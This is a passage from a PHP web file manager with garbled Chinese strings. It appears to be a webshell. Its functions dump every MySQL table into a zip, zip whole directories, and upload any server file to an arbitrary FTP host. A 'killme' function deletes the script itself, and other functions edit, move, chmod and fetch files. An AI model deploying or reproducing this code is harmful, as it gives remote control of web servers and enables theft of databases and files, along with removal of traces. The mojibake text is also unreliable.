/* Moves the oldfile to the new one.                            */
/* Recieves $file and $ndir and creates $file.$ndir             */
/****************************************************************/
function move($file, $ndir, $folder) {
  global $folder;
  if (!$file == "") {
    maintop("�ƶ�");
    if (rename($folder.$file, $ndir.$file)) {
      echo $folder.$file." �Ѿ��ɹ��ƶ��� ".$ndir.$file
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    } else {
      echo "�޷��ƶ� ".$folder.$file
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    }
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function viewframe()                                         */
/*                                                              */
/* First step in viewframe.                                     */
/* Takes the specified file and displays it in a frame.         */
/* Recieves $file and sends it to viewtop                       */
/****************************************************************/
function viewframe($file) {
  global $sitetitle, $folder, $HTTP_HOST, $filefolder;  
  if ($filefolder == "/") {
    $error="**����: ��ѡ��鿴$file �����Ŀ¼�� /.**";
    printerror($error);
    die();
  } elseif (ereg("/home/",$folder)) {
    $folderx = ereg_replace("$filefolder", "", $folder);
    $folder = "http://".$HTTP_HOST."/".$folderx;
  }
     maintop("�鿴�ļ�",true);

    echo "<iframe width=\"99%\" height=\"99%\" src=\"".$folder.$file."\">\n"
      ."��վʹ���˿�ܼ���,���������������֧�ֿ��,����������������Ա��������ʱ�վ."
      ."</iframe>\n\n";
     mainbottom();
}


/****************************************************************/
/* function viewtop()                                           */
/*                                                              */
/* Second step in viewframe.                                    */
/* Controls the top bar on the viewframe.                       */
/* Recieves $file from viewtop.                                 */
/****************************************************************/
function viewtop($file) {
  global $viewing, $iftop;
  $viewing = "yes";
  $iftop = "target=_top";
  maintop("�鿴�ļ� - $file");
}


/****************************************************************/
/* function logout()                                            */
/*                                                              */
/* Logs the user out and kills cookies                          */
/****************************************************************/
function logout() {
  global $login;
  setcookie("user","",time()-60*60*24*1);
  setcookie("pass","",time()-60*60*24*1);

  maintop("�˳�",false);
  echo "���Ѿ��˳�."
      ."<br><br>"
      ."<a href=".$adminfile."?op=home>����������µ�¼.</a>";
  mainbottom();
}


/****************************************************************/
/* function mainbottom()                                        */
/*                                                              */
/* Controls the bottom copyright.                               */
/****************************************************************/
function mainbottom() {
  echo "</table></table>\n"
      ."</table></table></body>\n"
      ."</html>\n";
  exit;
}

/****************************************************************/
/* function sqlb()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/

function sqlb() {
  maintop("���ݿⱸ��");
  echo $content 
      ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><font class=error>**����: �⽫�������ݿ⵼����ѹ����mysql.zip�Ķ���! ����ڸ��ļ�,���ļ���������!**</font><br><br><form action=\"".$adminfile."?op=sqlbackup\" method=\"POST\">���ݿ��ַ:&nbsp;&nbsp;<input name=\"ip\" size=\"30\" /><br>���ݿ�����:&nbsp;&nbsp;<input name=\"sql\" size=\"30\" /><br>���ݿ��û�:&nbsp;&nbsp;<input name=\"username\" size=\"30\" /><br>���ݿ�����:&nbsp;&nbsp;<input name=\"password\" size=\"30\" /><br>���ݿ����:&nbsp;&nbsp;<select id=\"chset\"><option id=\utf8\">utf8</option></select><br><input name=\"submit\" value=\"����\" type=\"submit\" /></form>\n
";
  mainbottom();
}

/****************************************************************/
/* function sqlbackup()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function sqlbackup($ip,$sql,$username,$password) {
  maintop("���ݿⱸ��");
$database=$sql;//���ݿ���
$options=array(
    'hostname' => $ip,//ip��ַ
    'charset' => 'utf8',//����
    'filename' => $database.'.sql',//�ļ���
    'username' => $username,
    'password' => $password
);
mysql_connect($options['hostname'],$options['username'],$options['password'])or die("�����������ݿ�!");
mysql_select_db($database) or die("���ݿ����ƴ���!");
mysql_query("SET NAMES '{$options['charset']}'");
$tables = list_tables($database);
$filename = sprintf($options['filename'],$database);
$fp = fopen($filename, 'w');
foreach ($tables as $table) {
    dump_table($table, $fp);
}
fclose($fp);
//ѹ��sql�ļ�
if (file_exists('mysql.zip')) {
unlink('mysql.zip'); }
else {
}
$file_name=$options['filename'];
$zip = new ZipArchive;
$res = $zip->open('mysql.zip', ZipArchive::CREATE);
if ($res === TRUE) {
$zip->addfile($file_name);
$zip->close();
//ɾ���������ϵ�sql�ļ�
unlink($file_name);
echo '���ݿ⵼����ѹ����ɣ�'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
} else {
echo '���ݿ⵼����ѹ��ʧ�ܣ�'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
}
exit;
//��ȡ�������
  mainbottom();
}

function list_tables($database)
{
    $rs = mysql_list_tables($database);
    $tables = array();
    while ($row = mysql_fetch_row($rs)) {
        $tables[] = $row[0];
    }
    mysql_free_result($rs);
    return $tables;
}
//�������ݿ�
function dump_table($table, $fp = null)
{
    $need_close = false;
    if (is_null($fp)) {
        $fp = fopen($table . '.sql', 'w');
        $need_close = true;
    }
$a=mysql_query("show create table `{$table}`");
$row=mysql_fetch_assoc($a);fwrite($fp,$row['Create Table'].';');//������ṹ
    $rs = mysql_query("SELECT * FROM `{$table}`");
    while ($row = mysql_fetch_row($rs)) {
        fwrite($fp, get_insert_sql($table, $row));
    }
    mysql_free_result($rs);
    if ($need_close) {
        fclose($fp);
    }
}
//����������
function get_insert_sql($table, $row)
{
    $sql = "INSERT INTO `{$table}` VALUES (";
    $values = array();
    foreach ($row as $value) {
        $values[] = "'" . mysql_real_escape_string($value) . "'";
    }
    $sql .= implode(', ', $values) . ");";
    return $sql;
}

function z($dename) {
  global $dename;
    maintop("Ŀ¼ѹ��");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<font class=error>**����: �⽫����Ŀ¼ѹ��Ϊ".$dename.".zip�Ķ���! ����ڸ��ļ������ļ���������!**</font><br><br>\n"
        ."ȷ��Ҫ����Ŀ¼ѹ��?<br><br>\n"
        ."<a href=\"".$adminfile."?op=zip&dename=".$dename."&folder=$folder\">ȷ��</a> | \n"
        ."<a href=\"".$adminfile."?op=home\"> ȡ�� </a>\n"
        ."</table>\n";
    mainbottom();
}

function zip($dename) {
  global $dename;
  $path = './'.$dename;
maintop("Ŀ¼ѹ��");
if (file_exists($dename.'.zip')) {
unlink($dename.'.zip'); }
else {
}
class Zipper extends ZipArchive {
public function addDir($path) {
print 'adding ' . $path . '<br>';
$this->addEmptyDir($path);
$nodes = glob($path . '/*');
foreach ($nodes as $node) {
print $node . '<br>';
if (is_dir($node)) {
$this->addDir($node);
} else if (is_file($node))  {
$this->addFile($node);
}
}
} 
}
$zip = new Zipper;
$res = $zip->open($dename.'.zip', ZipArchive::CREATE);
if ($res === TRUE) {
$zip->addDir($path);
$zip->close();
echo 'ѹ����ɣ�'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
} else {
echo 'ѹ��ʧ�ܣ�'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
}
    mainbottom();
}

function killme($dename) {
  global $folder;
  if (!$dename == "") {
    maintop("��ɱ");
      if(unlink($folder.$dename)) {
        echo "��ɱ�ɹ�. "
        ."&nbsp;<a href=".$folder.">������վ��ҳ</a>\n";
      } else {
        echo "�޷���ɱ. "
        ."&nbsp;<a href=\"/\">������վ��ҳ</a>\n";
      }
    mainbottom();
  } else {
    home();
  }
}



/****************************************************************/
/* function ftpa()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/

function ftpa() {
  maintop("FTP����");
  echo $content 
      ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><font class=error>**����: �⽫���ļ�Զ���ϴ�������ftp! ��Ŀ¼���ڸ��ļ�,�ļ���������!**</font><br><br><form action=\"".$adminfile."?op=ftpall\" method=\"POST\">FTP&nbsp;��ַ:&nbsp;&nbsp;<input name=\"ftpip\" size=\"30\" /><br>FTP&nbsp;�û�:&nbsp;&nbsp;<input name=\"ftpuser\" size=\"30\" /><br>FTP&nbsp;����:&nbsp;&nbsp;<input name=\"ftppass\" size=\"30\" /><br>�ϴ��ļ�:&nbsp;&nbsp;<input name=\"ftpfile\" size=\"30\" /><br><input name=\"submit\" value=\"����\" type=\"submit\" /></form>\n
";
  mainbottom();
}

/****************************************************************/
/* function ftpall()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function ftpall($ftpip,$ftpuser,$ftppass,$ftpfile) {
  maintop("FTP����");
$ftp_server=$ftpip;//������
$ftp_user_name=$ftpuser;//�û���
$ftp_user_pass=$ftppass;//����
$ftp_port='21';//�˿�
$ftp_put_dir='./';//�ϴ�Ŀ¼
$ffile=$ftpfile;//�ϴ��ļ�

$ftp_conn_id = ftp_connect($ftp_server,$ftp_port);
$ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);

if ((!$ftp_conn_id) || (!$ftp_login_result)) {
 echo "���ӵ�ftp������ʧ��";
 exit;
} else {
 ftp_pasv ($ftp_conn_id,true); //����һ��ģʽ��������֣���Щftp������һ����Ҫִ�����
 ftp_chdir($ftp_conn_id, $ftp_put_dir);
 $ftp_upload = ftp_put($ftp_conn_id,$ffile,$ffile, FTP_BINARY);
 //var_dump($ftp_upload);//�����Ƿ�д��ɹ�
 ftp_close($ftp_conn_id); //�Ͽ�
}
echo "�ļ� ".$ftpfile." �ϴ��ɹ�.\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
  mainbottom();
}

/****************************************************************/
/* function printerror()                                        */
/*                                                              */
/* Prints error onto screen                                     */
/* Recieves $error and prints it.                               */
/****************************************************************/
function printerror($error) {
  maintop("����");
  echo "<font class=error>\n".$error."\n</font>";
  mainbottom();
}


/****************************************************************/
/* function switch()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $op() and switches to it                            *.
/****************************************************************/
switch($op) {

    case "home":
	home();
	break;
    case "up":
	up();
	break;
    case "yupload":
	yupload($_POST['url']);
	break;
    case "upload":
	upload($_FILES['upfile'], $_REQUEST['ndir']);
	break;

    case "del":
	del($_REQUEST['dename']);
	break;

    case "delete":
	delete($_REQUEST['dename']);
	break;

    case "unz":
	unz($_REQUEST['dename']);
	break;

    case "unzip":
	unzip($_REQUEST['dename']);
	break;
	
    case "sqlb":
	sqlb();
	break;

    case "sqlbackup":
	sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);
	break;
	
    case "ftpa":
	ftpa();
	break;

    case "ftpall":
	ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['ftpfile']);
	break;

    case "allz":
	allz();
	break;

    case "allzip":
	allzip();
	break;

    case "edit":
	edit($_REQUEST['fename']);
	break;

    case "save":
	save($_REQUEST['ncontent'], $_REQUEST['fename']);
	break;

    case "cr":
	cr();
	break;

    case "create":
	create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
	break;

    case "chm":
	chm($_REQUEST['file']);
	break;

    case "chmodok":
	chmodok($_REQUEST['rename'], $_REQUEST['nchmod'], $folder);
	break;

    case "ren":
	ren($_REQUEST['file']);
	break;

    case "rename":
	renam($_REQUEST['rename'], $_REQUEST['nrename'], $folder);
	break;

    case "mov":
	mov($_REQUEST['file']);
	break;

    case "move":
	move($_REQUEST['file'], $_REQUEST['ndir'], $folder);
	break;

    case "viewframe":
	viewframe($_REQUEST['file']);
	break;

    case "viewtop":
	viewtop($_REQUEST['file']);
	break;

    case "printerror":
	printerror($error);
	break;

    case "logout":
	logout();
	break;
	
    case "z":
	z($_REQUEST['dename']);
	break;

    case "zip":
	zip($_REQUEST['dename']);
	break;

    case "killme":
	killme($_REQUEST['dename']);
	break;

    default:
	home();
	break;
}
?>